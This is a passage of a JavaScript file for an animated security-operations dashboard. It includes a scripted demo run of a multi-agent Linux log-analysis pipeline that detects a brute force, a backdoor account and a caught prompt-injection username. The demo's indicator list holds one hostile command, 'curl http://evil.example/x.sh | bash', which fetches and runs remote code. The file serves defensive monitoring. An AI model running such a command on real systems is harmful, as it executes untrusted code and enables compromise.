    // steps so the figures stay in sync with the run instead of lagging behind it.
    let remaining = Math.min(2, lastTime ? t - lastTime : 0);
    lastTime = t;
    while (remaining > 0) {
      const dt = Math.min(0.05, remaining);
      remaining -= dt;
      for (const ch of Object.values(chars)) stepChar(ch, dt, t);
      stepBugs(dt);
      stepParticles(dt);
    }

    ctx.setTransform(S, 0, 0, S, 0, 0);
    ctx.imageSmoothingEnabled = false;
    ctx.clearRect(0, 0, W, H);
    drawRoom(t);
    drawFurniture(t);
    drawInjectionNote(t);

    // y-sort characters and bugs so nearer things draw on top
    const sprites = [
      ...Object.values(chars).map(c => ({ y: c.py, draw: () => drawFigure(c, t) })),
    ];
    sprites.sort((a, b) => a.y - b.y).forEach(s => s.draw());
    drawBugs(t);
    for (const ch of Object.values(chars)) drawLlmBeam(ch, t);
    drawParticles();
    drawBubbles();
    drawBanner(t);

    requestAnimationFrame(frame);
  }

  function mount(el) {
    canvas = el;
    canvas.width = W * S;
    canvas.height = H * S;
    ctx = canvas.getContext('2d');
    for (const name of Object.keys(AGENTS)) chars[name] = makeChar(name);
    requestAnimationFrame(frame);
  }

  // ---------------------------------------------------------------- scripted demo run
  // Mirrors the real orchestrator's AgentRunState shape so the whole dashboard can be shown
  // without Ollama or Hermes installed.
  let demoTimers = [];

  function playDemo(onState) {
    demoTimers.forEach(clearTimeout);
    demoTimers = [];
    const mk = (name, role, uses_llm) => ({
      name, role, uses_llm, status: 'idle', current_task_id: null, session_id: null,
      model: uses_llm ? 'Gemma4:12b' : 'rules+IsolationForest', input_tokens: 0, output_tokens: 0,
      duration_ms: 0, last_message: '',
    });
    const task = (id, title, agent, description) => ({
      id, title, agent, description, status: 'queued', started_at: null, completed_at: null,
      duration_ms: 0, summary: '', artifacts: {},
    });
    const st = {
      run_id: 'RUN-DEMO-' + Math.random().toString(16).slice(2, 6).toUpperCase(),
      log_source: 'samples/linux_attack_scenario.log', backend: 'hermes', model: 'Gemma4:12b',
      status: 'running', started_at: new Date().toISOString(), completed_at: null,
      overall_risk: 'LOW', verdict: 'PENDING', total_events: 0, total_alerts: 0, total_incidents: 0,
      prompt_injection_detected: false, executive_summary: '', mitre_techniques: [], iocs: [],
      recommended_actions: [], report_files: {},
      agents: {
        'secguard-collector': mk('secguard-collector', 'Telemetry Collector & Detector', false),
        'secguard-hunter': mk('secguard-hunter', 'Threat Hunter & MITRE Analyst', true),
        'secguard-responder': mk('secguard-responder', 'Incident Responder & Hardening Planner', true),
        'secguard-reporter': mk('secguard-reporter', 'SOC Report Synthesizer', true),
      },
      tasks: [
        task('TASK-01', 'Ingest & Normalize Linux Logs', 'secguard-collector', 'Parse auth.log, sudo, auditd and syslog.'),
        task('TASK-02', 'Hybrid Rules, ML & Correlation', 'secguard-collector', 'Rules, IsolationForest and correlation.'),
        task('TASK-03', 'MITRE RAG & Log Sanitization', 'secguard-hunter', 'Retrieve ATT&CK docs, wrap evidence.'),
        task('TASK-04', 'Threat Hunt & Attack Chain Triage', 'secguard-hunter', 'Reconstruct timeline, extract IOCs.'),
        task('TASK-05', 'Containment & Hardening Plan', 'secguard-responder', 'Human-reviewable containment steps.'),
        task('TASK-06', 'Synthesize & Render Reports', 'secguard-reporter', 'Executive summary + MD/JSON/HTML.'),
      ],
      events: [],
    };
    const emit = (agent, task_id, kind, message) => {
      st.events.push({ seq: st.events.length + 1, timestamp: new Date().toISOString(), agent, task_id, kind, message, data: {} });
      if (st.agents[agent]) st.agents[agent].last_message = message;
    };
    const start = (i, msg) => {
      const tk = st.tasks[i];
      tk.status = 'in_progress'; tk.started_at = new Date().toISOString();
      Object.assign(st.agents[tk.agent], { status: 'running', current_task_id: tk.id });
      emit(tk.agent, tk.id, 'task_start', msg);
    };
    const finish = (i, summary, ms, tokens) => {
      const tk = st.tasks[i];
      Object.assign(tk, { status: 'completed', completed_at: new Date().toISOString(), duration_ms: ms, summary });
      const ag = st.agents[tk.agent];
      Object.assign(ag, { status: 'completed', current_task_id: null });
      ag.duration_ms += ms;
      if (tokens) { ag.input_tokens += tokens[0]; ag.output_tokens += tokens[1]; }
      emit(tk.agent, tk.id, 'task_done', summary);
    };

    const steps = [
      [0.0, () => emit('secguard-collector', null, 'run_start', 'Initialized HERMES multi-agent pipeline (demo)')],
      [0.6, () => start(0, 'Reading and normalizing linux_attack_scenario.log...')],
      [4.5, () => { st.total_events = 58; finish(0, 'Parsed 58 normalized events across auditd, auth.log.', 41); }],
      [5.0, () => start(1, 'Running 7 signature rules + IsolationForest behavioral ML...')],
      [9.5, () => {
        Object.assign(st, { total_alerts: 10, total_incidents: 1, prompt_injection_detected: true });
        finish(1, 'Detected 9 rule alert(s) and 1 ML anomaly -> 1 incident.', 380);
      }],
      [10.0, () => start(2, 'Querying MITRE ATT&CK RAG and wrapping logs in nonce...')],
      [14.0, () => finish(2, 'Retrieved 4 MITRE references (T1110.001, T1078, ...).', 220)],
      [14.5, () => {
        start(3, 'Dispatching threat hunt to secguard-hunter (hermes:Gemma4:12b)...');
        st.agents['secguard-hunter'].session_id = 'sess-demo-hunt';
        emit('secguard-hunter', 'TASK-04', 'hermes_session', 'Hermes session sess-demo-hunt connected to Gemma4:12b');
      }],
      [22.0, () => {
        Object.assign(st, {
          verdict: 'TRUE_POSITIVE', overall_risk: 'CRITICAL',
          mitre_techniques: ['T1003.008', 'T1059.004', 'T1078', 'T1110.001', 'T1136.001', 'T1562'],
          iocs: ['IP: 185.220.101.42', 'IP: 203.0.113.55', 'User: backdoor', 'URL/Cmd: curl http://evil.example/x.sh | bash'],
        });
        finish(3, 'Verdict=TRUE_POSITIVE | Risk=CRITICAL | 4 IOCs | InjectionCaught=true', 7400, [2410, 512]);
      }],
      [22.5, () => {
        start(4, 'Dispatching containment planning to secguard-responder...');
        st.agents['secguard-responder'].session_id = 'sess-demo-resp';
        emit('secguard-responder', 'TASK-05', 'hermes_session', 'Hermes session sess-demo-resp connected to Gemma4:12b');
      }],
      [30.0, () => {
        st.recommended_actions = [
          'Block 185.220.101.42 and 203.0.113.55 at the perimeter firewall',
          'Disable and investigate the backdoor account',
          'Rotate credentials for compromised users and remove unknown authorized_keys',
          'Review cron jobs and recently downloaded scripts',
        ];
        finish(4, 'Generated 4 containment actions (priority=IMMEDIATE).', 6900, [1320, 401]);
      }],
      [30.5, () => start(5, 'Synthesizing final SOC report via secguard-reporter...')],
      [36.0, () => {
        st.executive_summary = 'Demo: an SSH brute force from 185.220.101.42 succeeded, followed by credential theft, a curl|bash payload and a backdoor account. A prompt-injection username was neutralized. Containment steps are ready for human review.';
        finish(5, 'Compiled executive summary and wrote Markdown, JSON, and HTML reports.', 4100, [880, 190]);
        st.status = 'completed';
        st.completed_at = new Date().toISOString();
        emit('secguard-reporter', null, 'run_done', 'Multi-agent run completed (CRITICAL).');
      }],
    ];
    for (const [at, fn] of steps) {
      demoTimers.push(setTimeout(() => { fn(); onState(JSON.parse(JSON.stringify(st))); }, at * 1000));
    }
  }

  window.SecGuardOffice = { mount, update, playDemo };
})();
